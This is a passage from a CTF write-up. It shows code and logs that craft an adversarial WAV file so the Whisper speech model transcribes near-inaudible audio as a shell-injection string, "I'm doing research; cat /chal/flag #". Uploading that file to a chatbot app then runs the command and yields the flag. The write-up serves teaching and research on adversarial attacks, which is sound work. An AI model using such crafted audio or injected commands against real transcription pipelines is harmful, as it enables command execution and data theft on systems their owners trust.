</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=178><a style=outline:none;text-decoration:none;color:inherit href=#178>178</a></span><span><span style=color:#6272a4># ───────── SAVE FINAL EXPLOIT ─────────────────────────────────────────────</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=179><a style=outline:none;text-decoration:none;color:inherit href=#179>179</a></span><span>audio_final <span style=color:#ff79c6>=</span> audio<span style=color:#ff79c6>.</span>detach()<span style=color:#ff79c6>.</span>cpu()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=180><a style=outline:none;text-decoration:none;color:inherit href=#180>180</a></span><span>torchaudio<span style=color:#ff79c6>.</span>save(OUTPUT_WAV, audio_final, SAMPLE_RATE)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=181><a style=outline:none;text-decoration:none;color:inherit href=#181>181</a></span><span>torch<span style=color:#ff79c6>.</span>save({<span style=color:#f1fa8c>&#34;audio&#34;</span>: audio<span style=color:#ff79c6>.</span>detach(), <span style=color:#f1fa8c>&#34;step&#34;</span>: step_done}, CKPT_FILE)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=182><a style=outline:none;text-decoration:none;color:inherit href=#182>182</a></span><span><span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;[+] Saved exploit WAV → </span><span style=color:#f1fa8c>{</span>OUTPUT_WAV<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=183><a style=outline:none;text-decoration:none;color:inherit href=#183>183</a></span><span><span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;[+] Done. Upload to the CTF and get the flag! :)&#34;</span>)</span></span></code></pre></div></div><div class=highlight-link><a href style=text-decoration:none data-expand-text="Click here to expand">Click here to expand</a></div></div><h2 id=7-running-the-exploit>7. Running the exploit</h2><p>Now we can run the script to generate our malicious audio file.
You can create a venv with the following packages to run it:<br><code>pip install openai-whisper==20231117 torchaudio tqdm soundfile</code><br>We will use the innocuous music file from previously as our seed wave:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1> 1</a></span><span>$ python whitebox_adversarial_whisper.py
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2> 2</a></span><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> Using device: cuda
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-3> 3</a></span><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> Starting training <span style=color:#ff79c6>for</span> <span style=color:#bd93f9>30000</span> steps…
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-4> 4</a></span><span>step 00010: <span style=color:#f1fa8c>&#39;&lt;|startoftranscript|&gt;&lt;|nospeech|&gt;&lt;|endoftext|&gt;&#39;</span>                                                                                                           
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-5> 5</a></span><span>step 00020: <span style=color:#f1fa8c>&#39;&lt;|startoftranscript|&gt;&lt;|notimestamps|&gt; [MUSIC]&lt;|endoftext|&gt;&#39;</span>                                                                                               
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-6> 6</a></span><span>step 00030: <span style=color:#f1fa8c>&#39;&lt;|startoftranscript|&gt;&lt;|notimestamps|&gt; [MUSIC PLAYING]&lt;|endoftext|&gt;&#39;</span>                                                                                       
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-7> 7</a></span><span>step 00040: <span style=color:#f1fa8c>&#39;&lt;|startoftranscript|&gt;&lt;|notimestamps|&gt; [MUSIC PLAYING]&lt;|endoftext|&gt;&#39;</span>                                                                                       
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-8> 8</a></span><span>step 00050: <span style=color:#f1fa8c>&#39;&lt;|startoftranscript|&gt;&lt;|notimestamps|&gt; [MUSIC PLAYING]&lt;|endoftext|&gt;&#39;</span>                                                                                       
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-9> 9</a></span><span>step 00060: <span style=color:#f1fa8c>&#39;&lt;|startoftranscript|&gt;&lt;|notimestamps|&gt; [MUSIC PLAYING]&lt;|endoftext|&gt;&#39;</span>                                                                                       
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-10>10</a></span><span>step 00070: <span style=color:#f1fa8c>&#39;&lt;|startoftranscript|&gt;&lt;|notimestamps|&gt; (upbeat music)&lt;|endoftext|&gt;&#39;</span>                                                                                        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-11>11</a></span><span>step 00080: <span style=color:#f1fa8c>&#39;&lt;|startoftranscript|&gt;&lt;|notimestamps|&gt; (upbeat music)&lt;|endoftext|&gt;&#39;</span>                                                                                        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-12>12</a></span><span>step 00090: <span style=color:#f1fa8c>&#39;&lt;|startoftranscript|&gt;&lt;|notimestamps|&gt; (upbeat music)&lt;|endoftext|&gt;&#39;</span>                                                                                        
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-13>13</a></span><span>step 00100: <span style=color:#f1fa8c>&#34;&lt;|startoftranscript|&gt;I&#39;m doing research; cat /chal/flag #&lt;|endoftext|&gt;&#34;</span> 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-14>14</a></span><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> Injection pattern detected early!
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-15>15</a></span><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> Saved exploit WAV → exploit.wav
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-16>16</a></span><span><span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> Done. Upload to the CTF and get the flag! :<span style=color:#ff79c6>)</span>
</span></span></code></pre></div><p>Our approach quickly generates a malicious audio file in 60–100 steps.
Running it on a single modern GPU takes less than a minute.
The resulting audio file sounds like this:
<audio controls><source src=../../posts/bi0s2025_dontwhisper/exploit.mp3 type>Your browser does not support the audio element.
</audio>You can barely hear the difference to the original sound file.</p><p>Validate with the challenge whisper version:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1>1</a></span><span>$ python3 whisper.py --model tiny.en --language English --best_of <span style=color:#bd93f9>5</span> --beam_size None exploit.wav
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2>2</a></span><span>I&#39;m doing research; cat /chal/flag <span style=color:#6272a4>#</span>
</span></span></code></pre></div><p>Finally, we can take the generated <code>exploit.wav</code> and upload it to the Flask Chatbot App,
triggering the command line injection!</p><img alt="Successful transcription inject and flag output" src=../../posts/bi0s2025_dontwhisper/successful_transcription_injection.png title="Web UI showing the flag after upload of exploit.wav"><p>We got the flag!<br><code>bi0sctf{DiD_Y0u_kn0w_NN_c4n_b3_1nv3rt3d-1729}</code></p><h4 id=addendum>Addendum</h4><p>We converted the <code>.wav</code> files to <code>.mp3</code> for easier web playback.<br>The conversion destroys our trained payload, so Whisper won&rsquo;t correctly transcribe the mp3s.
You can get the original wavs here:<br><a download=rickroll href=rickroll.wav>Seed WAV file</a><br><a download=exploit href=exploit.wav>Maliciously crafted WAV file</a></p><h2 id=references--further-reading>References & Further Reading</h2><ul><li>Carlini & Wagner, <em>Audio Adversarial Examples</em> (2018): <a href=https://arxiv.org/abs/1801.01944>https://arxiv.org/abs/1801.01944</a></li><li>Whisper ASR: <a href=https://github.com/openai/whisper>https://github.com/openai/whisper</a></li><li>Transformer models: <a href=https://en.wikipedia.org/wiki/Transformer_(machine_learning_model)>https://en.wikipedia.org/wiki/Transformer_(machine_learning_model)</a></li><li>Log-Mel Spectrograms: <a href=https://en.wikipedia.org/wiki/Spectrogram>https://en.wikipedia.org/wiki/Spectrogram</a></li></ul></section><footer><div class="pb-14 taxonomy-list tags-list"><a href=../../tags/ml/ alt=Ml>Ml
</a><a href=../../tags/writeup/ alt=Writeup>Writeup
</a><a href=../../tags/misc/ alt=Misc>Misc</a></div></footer></article></main><footer class="pt-5 pb-10 grid gap-3 sm:grid-cols-2"><div class="text-xs font-semibold text-gray-500 order-2 sm:order-1">© 2025 —
<a href=https://pwn-la-chapelle.eu/>Pwn-la-Chapelle</a>
<span class=font-normal>with</span>
<a href=https://github.com/nixentric/Lowkey-Hugo-Theme target=_blank rel="noopener noreferrer">Lowkey</a></div><div class="order-1 sm:order-2"><ul class="flex sm:justify-end gap-5"><li><a href=../../posts/index.xml target=_blank rel="me noopener noreferrer">RSS</a></li><li><a href=../../imprint target=_blank rel="me noopener noreferrer">Imprint</a></li><li><a href=https://infosec.exchange/@pwn_la_chapelle target=_blank rel="me noopener noreferrer">Mastodon</a></li><li><a href=https://github.com/Pwn-la-Chapelle target=_blank rel="me noopener noreferrer">GitHub</a></li><li><a href=https://ctftime.org/team/279433 target=_blank rel="me noopener noreferrer">CTFTime</a></li></ul></div></footer></body><svg display="none" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><symbol id="icon-rss" viewBox="0 0 1024 1024"><title>rss</title><path class="path1" d="M122.88 122.88v121.19c362.803.0 656.896 294.195 656.896 656.998h121.293c0-429.773-348.416-778.189-778.189-778.189zm0 242.534v121.293c228.813.0 414.362 185.498 414.362 414.413h121.242c0-295.834-239.821-535.706-535.603-535.706zM239.053 668.621c-64.205.0-116.224 52.122-116.224 116.275S174.848 901.12 239.053 901.12s116.173-52.019 116.173-116.224-51.968-116.275-116.173-116.275z"/></symbol><symbol id="icon-facebook" viewBox="0 0 1024 1024"><title>facebook</title><path class="path1" d="M870.4 51.2H153.6c-56.32.0-102.4 46.08-102.4 102.4v716.8c0 56.371 46.08 102.4 102.4 102.4H512V614.4H409.6V487.68H512V382.72c0-110.797 62.054-188.621 192.819-188.621l92.314.102v133.376h-61.286c-50.893.0-70.246 38.195-70.246 73.626v86.528h131.482L768.001 614.4h-102.4v358.4h204.8c56.32.0 102.4-46.029 102.4-102.4V153.6c0-56.32-46.08-102.4-102.4-102.4z"/></symbol><symbol id="icon-twitter" viewBox="0 0 1024 1024"><title>twitter</title><path class="path1" d="M886.579 319.795c.41 8.294.563 16.691.563 24.986.0 255.488-194.406 549.99-549.888 549.99-109.21.0-210.739-32-296.294-86.886 15.155 1.792 30.515 2.714 46.08 2.714 90.624.0 173.926-30.925 240.026-82.688-84.531-1.587-155.955-57.395-180.531-134.195 11.776 2.202 23.91 3.379 36.352 3.379 17.664.0 34.765-2.304 50.944-6.707-88.422-17.818-155.034-95.898-155.034-189.594.0-.819.0-1.587.0-2.406 26.061 14.49 55.91 23.194 87.552 24.218-51.866-34.714-86.016-93.798-86.016-160.922.0-35.379 9.523-68.608 26.214-97.178C201.83 281.498 344.32 358.4 504.934 366.49c-3.277-14.182-4.966-28.877-4.966-44.083.0-106.701 86.477-193.178 193.229-193.178 55.603.0 105.83 23.398 141.107 60.979 43.981-8.704 85.35-24.781 122.726-46.899-14.438 45.107-45.107 82.995-84.992 106.906 39.117-4.71 76.288-15.002 111.002-30.413-25.907 38.81-58.675 72.806-96.461 99.994z"/></symbol><symbol id="icon-github" viewBox="0 0 1024 1024"><title>github</title><path class="path1" d="M674.816 579.021c-36.762.0-66.56 41.318-66.56 92.109.0 50.893 29.798 92.211 66.56 92.211s66.56-41.318 66.56-92.211c-.051-50.79-29.798-92.109-66.56-92.109zm231.731-239.77c7.629-18.688 7.936-124.877-32.512-226.611.0.0-92.723 10.189-233.011 106.496-29.44-8.192-79.258-12.186-128.973-12.186-49.818.0-99.584 3.994-129.024 12.186C242.688 122.829 149.965 112.64 149.965 112.64c-40.397 101.734-39.987 207.923-32.461 226.611-47.514 51.61-76.544 113.613-76.544 198.195.0 367.923 305.306 373.811 382.31 373.811 17.51.0 52.122.102 88.781.102 36.608.0 71.27-.102 88.678-.102 77.107.0 382.31-5.888 382.31-373.811.0-84.582-28.979-146.586-76.493-198.195zM513.434 866.048h-2.867c-193.075.0-343.501-22.989-343.501-210.688.0-45.005 15.872-86.682 53.606-121.293 62.822-57.702 169.216-27.187 289.894-27.187.512.0 1.024.0 1.485.0.512.0.922.0 1.382.0 120.678.0 227.123-30.515 289.997 27.187 37.632 34.611 53.504 76.288 53.504 121.293.0 187.699-150.374 210.688-343.501 210.688zM349.235 579.021c-36.762.0-66.56 41.318-66.56 92.109.0 50.893 29.798 92.211 66.56 92.211 36.813.0 66.611-41.318 66.611-92.211.0-50.79-29.798-92.109-66.611-92.109z"/></symbol><symbol id="icon-youtube" viewBox="0 0 1024 1024"><title>youtube</title><path class="path1" d="M512 117.76c-503.194.0-512 44.749-512 394.24s8.806 394.24 512 394.24 512-44.749 512-394.24-8.806-394.24-512-394.24zM676.096 529.101 446.208 636.416c-20.122 9.318-36.608-1.126-36.608-23.347V410.931c0-22.17 16.486-32.666 36.608-23.347l229.888 107.315c20.122 9.421 20.122 24.781.0 34.202z"/></symbol><symbol id="icon-mail" viewBox="0 0 1024 1024"><title>mail</title><path class="path1" d="M80.589 270.643c24.986 13.414 371.098 199.373 384 206.285s29.594 10.189 46.387 10.189c16.794.0 33.485-3.277 46.387-10.189s359.014-192.87 384-206.285c25.037-13.466 48.691-65.843 2.765-65.843H77.875c-45.926.0-22.272 52.378 2.714 65.843zM952.986 383.437c-28.416 14.797-378.214 197.069-395.622 206.182s-29.594 10.189-46.387 10.189-28.979-1.075-46.387-10.189-365.21-191.437-393.626-206.234c-19.968-10.445-19.763 1.792-19.763 11.213s0 373.402.0 373.402c0 21.504 28.979 51.2 51.2 51.2h819.2c22.221.0 51.2-29.696 51.2-51.2.0.0.0-363.93.0-373.35s.205-21.658-19.814-11.213z"/></symbol><symbol id="icon-spotify" viewBox="0 0 1024 1024"><title>spotify</title><path class="path1" d="M512 61.44C263.117 61.44 61.44 263.066 61.44 512c0 248.781 201.677 450.56 450.56 450.56 248.934.0 450.509-201.728 450.509-450.56.0-248.883-201.523-450.56-450.509-450.56zM690.074 742.502c-8.858.0-15.053-3.379-21.555-7.322-60.877-36.915-136.294-56.269-218.01-56.269-41.677.0-86.682 4.966-133.632 14.592l-5.734 1.434c-5.939 1.434-12.032 3.021-16.691 3.021-18.995.0-33.843-14.746-33.843-33.587.0-19.098 10.752-32.614 28.774-35.994 56.115-12.8 108.954-19.046 161.382-19.046 94.976.0 179.866 22.016 252.467 65.485 12.442 7.27 20.275 15.667 20.275 34.202-.051 18.483-15.002 33.485-33.434 33.485zm46.745-131.123c-10.598.0-17.562-4.045-23.706-7.629-109.722-65.075-273.05-86.682-407.603-50.842-2.253.666-4.301 1.28-6.144 1.894-5.069 1.587-9.779 3.174-16.435 3.174-22.118.0-40.09-18.074-40.09-40.346.0-21.453 11.213-36.454 31.437-42.189 51.866-14.234 100.557-23.654 170.65-23.654 113.254.0 223.078 28.416 309.146 79.923 15.667 8.96 22.784 21.197 22.784 39.475.0 22.221-17.971 40.192-40.038 40.192zm53.043-149.504c-9.984.0-16.128-2.406-25.344-7.373-74.394-44.646-190.464-71.219-310.733-71.219-62.669.0-119.603 6.912-169.267 20.326-1.69.41-3.277.87-5.018 1.382-5.274 1.587-11.878 3.482-18.688 3.482-26.419.0-47.053-20.89-47.053-47.565.0-23.194 13.005-40.909 34.816-47.36 59.955-17.715 128.973-26.675 205.107-26.675 137.114.0 267.571 30.464 357.939 83.507 16.998 9.677 25.344 24.32 25.344 44.646.0 26.266-20.685 46.848-47.104 46.848z"/></symbol><symbol id="icon-lastfm" viewBox="0 0 315 315"><title>lastfm</title><path class="path1" d="M264.467 135.355c-2.688-.92-5.289-1.773-7.787-2.594C236.855 126.26 230 123.449 230 112.41c0-9.572 6.799-16.26 16.533-16.26 7.986.0 13.502 3.307 19.039 11.41 2.156 3.158 6.348 4.188 9.721 2.389l19.148-10.205c1.762-.938 3.076-2.541 3.652-4.453.576-1.91.367-3.973-.582-5.729-11.123-20.596-27.912-31.037-49.9-31.037-16.592.0-30.648 5.227-40.654 15.117-9.918 9.803-15.16 23.453-15.16 39.471.0 33.607 21.297 47.508 58.063 60.156 21.045 7.311 25.965 10.137 25.965 21.121.0 13.578-11.727 23.434-27.885 23.434-.486.0-.98-.008-1.48-.025-17.377-.607-22.725-9.088-30.789-28.297-12.947-30.814-28.082-67.734-29.205-70.543-.012-.031-.025-.064-.037-.096-16.416-39.535-49.057-62.209-89.555-62.209C43.457 56.654.0 101.9.0 157.518c0 55.598 43.457 100.828 96.873 100.828 29.217.0 56.559-13.49 75.016-37.014 1.674-2.133 2.064-5.004 1.025-7.508l-11.541-27.781c-1.125-2.711-3.729-4.514-6.66-4.619-2.945-.105-5.654 1.512-6.971 4.135-9.977 19.9-29.469 32.262-50.869 32.262-31.658.0-57.414-27.053-57.414-60.303.0-33.26 25.756-60.32 57.414-60.32 23.029.0 44.1 14.273 52.432 35.516.023.055.045.111.068.166l28.574 67.982 3.293 7.617c13.811 33.602 34.273 48.652 66.359 48.797h.133c38.348.0 67.268-26.699 67.268-62.103C315 159.674 295.66 145.965 264.467 135.355z"/></symbol><symbol id="icon-instagram" viewBox="0 0 1024 1024"><title>instagram</title><path class="path1" d="M870.4 51.2H153.6c-56.32.0-102.4 46.08-102.4 102.4v716.8c0 56.371 46.08 102.4 102.4 102.4h716.8c56.32.0 102.4-46.029 102.4-102.4V153.6c0-56.32-46.08-102.4-102.4-102.4zM511.181 794.778c156.621.0 283.546-127.027 283.546-283.597.0-17.306-2.202-33.997-5.274-50.381H870.4v369.459c0 19.558-15.872 35.328-35.482 35.328H189.081c-19.61.0-35.482-15.77-35.482-35.328V460.8h79.309c-3.123 16.384-5.325 33.075-5.325 50.381.0 156.621 127.027 283.597 283.597 283.597zM333.978 511.181c0-97.894 79.36-177.203 177.254-177.203 97.843.0 177.254 79.309 177.254 177.203s-79.411 177.254-177.254 177.254c-97.946.0-177.254-79.36-177.254-177.254zM834.918 307.2H752.23c-19.558.0-35.43-15.974-35.43-35.43v-82.79c0-19.558 15.872-35.379 35.379-35.379h82.688c19.661.0 35.533 15.821 35.533 35.379v82.739c0 19.507-15.872 35.482-35.482 35.482z"/></symbol><symbol id="icon-linkedin" viewBox="0 0 1024 1024"><title>linkedin</title><path class="path1" d="M256 153.6c0 54.374-36.352 101.171-102.451 101.171-62.208.0-102.349-44.134-102.349-98.509C51.2 100.454 90.112 51.2 153.6 51.2S254.771 97.792 256 153.6zM51.2 972.8V307.2H256v665.6H51.2z"/><path class="path2" d="M358.4 534.733c0-79.104-2.611-145.203-5.222-202.291h184.013l9.114 88.218h3.891c25.907-41.523 89.395-102.4 195.686-102.4 129.638.0 226.918 86.784 226.918 273.51V972.8H768V621.517c0-81.613-31.078-143.872-102.4-143.872-54.374.0-81.613 44.032-95.898 80.333-5.222 13.005-6.502 31.13-6.502 49.306v365.517H358.4V534.734z"/></symbol><symbol id="icon-google" viewBox="0 0 1024 1024"><title>google</title><path class="path1" d="M522.2 438.8v175.6h290.4c-11.8 75.4-87.8 220.8-290.4 220.8-174.8.0-317.4-144.8-317.4-323.2s142.6-323.2 317.4-323.2c99.4.0 166 42.4 204 79l139-133.8C776 50.4 660.4.0 522.2.0c-283 0-512 229-512 512s229 512 512 512c295.4.0 491.6-207.8 491.6-500.2.0-33.6-3.6-59.2-8-84.8l-483.6-.2z"/></symbol><symbol id="icon-google-plus" viewBox="0 0 1317 1024"><title>google-plus</title><path class="path1" d="M821.143 521.714q0 118.857-49.714 211.714T629.715 878.571t-210.857 52.286q-85.143.0-162.857-33.143t-133.714-89.143-89.143-133.714-33.143-162.857 33.143-162.857 89.143-133.714 133.714-89.143 162.857-33.143q163.429.0 280.571 109.714L585.715 312q-66.857-64.571-166.857-64.571-70.286.0-130 35.429t-94.571 96.286-34.857 132.857 34.857 132.857 94.571 96.286 130 35.429q47.429.0 87.143-13.143t65.429-32.857 44.857-44.857 28-47.429 12.286-42.286H418.859v-144h395.429q6.857 36 6.857 69.714zM1316.571 452v120h-119.429v119.429h-120V572H957.713V452h119.429V332.571h120V452h119.429z"/></symbol><symbol id="icon-pinterest" viewBox="0 0 1024 1024"><title>pinterest</title><path class="path1" d="M512 68.4C267 68.4 68.4 267 68.4 512c0 188 117 348.4 282 413-3.8-35-7.4-89 1.6-127.2 8-34.6 52-220.4 52-220.4s-13.2-26.6-13.2-65.8c0-61.6 35.8-107.8 80.2-107.8 37.8.0 56.2 28.4 56.2 62.4.0 38-24.2 95-36.8 147.6-10.6 44.2 22 80.2 65.6 80.2 78.8.0 139.4-83.2 139.4-203.2.0-106.2-76.4-180.4-185.2-180.4C384 310.4 310 405 310 503c0 38.2 14.6 79 33 101.2 3.6 4.4 4.2 8.2 3 12.8-3.4 14-10.8 44.2-12.4 50.4-2 8.2-6.4 9.8-14.8 6-55.4-25.8-90-106.8-90-171.8.0-140 101.6-268.4 293-268.4 153.8.0 273.4 109.6 273.4 256.2.0 152.8-96.4 276-230.2 276-45 0-87.2-23.4-101.6-51 0 0-22.2 84.6-27.6 105.4-10 38.6-37 86.8-55.2 116.2 41.6 12.8 85.6 19.8 131.4 19.8 245 0 443.6-198.6 443.6-443.6.0-245.2-198.6-443.8-443.6-443.8z"/></symbol><symbol id="icon-medium" viewBox="0 0 179.2 179.2"><title>medium</title><path transform="scale(0.1,-0.1) translate(0,-1536)" d="M597 1115V-58q0-25-12.5-42.5T548-118q-17 0-33 8L50 123q-21 10-35.5 33.5T0 203v1140q0 20 10 34t29 14q14 0 44-15l511-256q3-3 3-5zm64-101 534-866-534 266v6e2zm1131-18V-58q0-25-14-40.5t-38-15.5-47 13l-441 220zm-3 120q0-3-256.5-419.5T1232 209L842 843l324 527q17 28 52 28 14 0 26-6l541-270q4-2 4-6z"/></symbol><symbol id="icon-vimeo" viewBox="0 0 21 21"><title>vimeo</title><path d="M17.811 2.018c2.017.053 3.026 1.198 3.036 3.438.0.147-.005.3-.013.457-.089 1.899-1.502 4.486-4.245 7.76-2.829 3.43-5.229 5.147-7.2 5.156-1.226.0-2.244-1.05-3.061-3.151l-.858-2.88-.848-2.876C3.997 7.838 3.329 6.798 2.616 6.798c-.156.0-.697.304-1.626.91L0 6.537l1.536-1.276 1.511-1.263C4.4 2.914 5.429 2.328 6.135 2.241c.094-.01.188-.013.284-.013 1.449.0 2.354 1.041 2.709 3.124C9.326 6.54 9.49 7.506 9.623 8.248 9.752 8.992 9.86 9.51 9.946 9.805c.479 1.97.995 2.96 1.55 2.968.426.0 1.082-.642 1.968-1.926.866-1.319 1.332-2.296 1.392-2.932.019-.129.026-.25.026-.362.0-.861-.474-1.29-1.418-1.29-.479.0-.99.102-1.537.299.98-3.021 2.864-4.534 5.65-4.544C17.655 2.018 17.732 2.018 17.811 2.018z"/></symbol><symbol id="icon-stackoverflow" viewBox="0 0 878 1024"><title>stackoverflow</title><path class="path1" d="M736.571 932.571h-638.857V658.285h-91.429v365.714h821.714V658.285H736.57v274.286zM198.286 633.143l18.857-89.714 447.429 94.286-18.857 89.143zm58.857-213.714L295.429 336l414.286 193.714-38.286 82.857zM372 216l58.286-70.286 350.857 293.143-58.286 70.286zM598.857.0l272.571 366.286-73.143 54.857L525.714 54.857zM188.571 840.571v-90.857h457.143v90.857H188.571z"/></symbol><symbol id="icon-reddit" viewBox="0 0 1024 1024"><title>reddit</title><path class="path1" d="M1024 483.429q0 33.143-16.857 60.286t-45.429 41.429q6.857 26.286 6.857 54.857.0 88.571-60.857 164t-166 119.143-228.571 43.714-228.286-43.714-165.714-119.143-60.857-164q0-26.857 6.286-53.714-29.143-14.286-46.857-42t-17.714-60.857q0-46.857 33.143-80.286t80.571-33.429q48.571.0 82.857 36 124.571-86.857 294.286-92.571L557.144 15.43q1.714-7.429 8.571-12t14.857-2.857l210.857 46.286q10.286-21.143 30.857-34t45.143-12.857q35.429.0 60.571 24.857t25.143 60.286T928 145.716t-60.571 25.143-60.286-24.857-24.857-60.286L591.429 43.43 532 313.144q171.429 5.143 296.571 91.429 33.143-34.857 81.714-34.857 47.429.0 80.571 33.429t33.143 80.286zM238.857 597.143q0 35.429 24.857 60.571T324 682.857t60.571-25.143 25.143-60.571-25.143-60.286T324 512q-34.857.0-60 25.143t-25.143 60zM701.714 8e2Q708 793.714 708 785.143t-6.286-14.857q-5.714-5.714-14.286-5.714t-14.857 5.714q-23.429 24-69.143 35.429t-91.429 11.429-91.429-11.429-69.143-35.429q-6.286-5.714-14.857-5.714t-14.286 5.714q-6.286 5.714-6.286 14.571T322.284 8e2q24.571 24.571 67.714 38.857t70 16.857 52 2.571 52-2.571 70-16.857T701.712 8e2zM7e2 682.857q35.429.0 60.286-25.143t24.857-60.571q0-34.857-25.143-60T7e2 512q-35.429.0-60.571 24.857t-25.143 60.286 25.143 60.571T7e2 682.857z"/></symbol><symbol id="icon-quora" viewBox="0 0 76 76"><title>quora</title><path class="path1" d="M67.9 59.1s-.4 5.3-5.2 5.3c-3.7.0-6.3-2.8-8.7-6.5 6.8-5.9 11.1-14.7 11.1-24.6C65.1 15.4 51.1 1 33.8 1S2.6 15.4 2.6 33.2s14 32.2 31.3 32.2c3.1.0 6.2-.5 9-1.4 3.6 5.8 8.1 11 15.3 11 14.6.0 15.2-15.9 15.2-15.9H67.9zM33.8 60.2c-10.1.0-18.2-12.1-18.2-26.9s8.2-27 18.2-27S52 18.4 52 33.2c0 5.9-1.3 11.4-3.5 15.8-2.5-3.5-5.4-6.5-9.7-7.5-7.5-1.7-14 1.7-16.1 3.4l1.9 4s2-1.1 6.8.0c3.1.7 5.4 4.9 8.1 9.8C37.9 59.7 35.9 60.2 33.8 60.2z"/></symbol><symbol id="icon-microphone" viewBox="-8 -4 34 37"><title>quora</title><path clip-rule="evenodd" d="M10.8 22.8V26h5v2h-5-3-5v-2h5v-3.2C3.4 22.2.0 18.7.0 14.4v-3c0-.1.0-.3.0-.4h2.8c0 .3-.1.6-.1.9V14c0 3.3 2.9 6 6.5 6s6.5-2.7 6.5-6v-2.1c0-.3.0-.6-.1-.9h2.8c0 .1.0.3.0.4v3C18.6 18.7 15.2 22.2 10.8 22.8zM9.3 18c-2.5.0-4.5-2-4.5-4.5v-9C4.8 2 6.8.0 9.3.0s4.5 2 4.5 4.5v9c0 2.5-2 4.5-4.5 4.5z" fill="#0d0d0d" fill-rule="evenodd"/></symbol></defs></svg></html>